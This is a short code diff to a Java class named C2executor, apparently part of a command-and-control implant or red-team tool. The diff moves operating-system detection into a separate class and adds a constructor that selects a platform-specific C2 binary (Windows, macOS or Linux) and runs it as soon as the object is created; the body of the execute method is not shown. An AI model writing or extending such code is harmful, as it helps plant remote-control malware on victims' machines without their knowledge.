@@ -1,5 +1,7 @@
 package executor;
 
+import systemproperties.OS;
+
 import java.io.*;
 import java.net.URL;
 
@@ -10,17 +12,13 @@ import java.net.URL;
 public class C2executor {
 
     private String fileName;
+    private OS os;
 
-    private String osSanitizer(String OS){
-        String c2File = "";
-        if(OS.indexOf("win")>=0){
-            c2File = "c2.exe";
-        } else if(OS.indexOf("mac")>=0){
-            c2File = "c2_signed_mac_binary";
-        } else if(OS.indexOf("nux")>=0){
-            c2File = "linux_binary";
-        }
-        return c2File;
+    public C2executor(){
+        this.os = new OS();
+        this.fileName = this.os.osSanitizer(this.os.getOS());
+
+        this.execute(this.fileName);
     }
 
     private void execute(String fileName){
